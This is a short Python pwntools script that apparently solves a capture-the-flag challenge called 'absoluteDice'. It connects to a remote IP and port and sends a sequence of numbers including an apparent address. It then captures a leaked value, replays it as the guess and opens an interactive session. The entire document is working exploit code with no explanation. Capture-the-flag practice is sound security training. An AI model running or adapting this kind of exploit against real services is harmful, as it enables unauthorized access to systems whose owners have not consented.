from pwn import *
#p=process('./absoluteDice')
p=remote('193.57.159.27',35383)
#raw_input("DEBUG")
elf = ELF('./absoluteDice')

for i in range(31):
	payload = str(i)
	p.sendline(payload)	
p.sendline("134515641")
p.sendline("1")
p.recvuntil('you said 134515641)')
p.recvuntil('Enter your guess> Absolute Dice scores a hit on you! (She had ')
guess = p.recvuntil(',')
print "guess: ",guess
for i in range(31):
	p.sendline(guess)

p.interactive()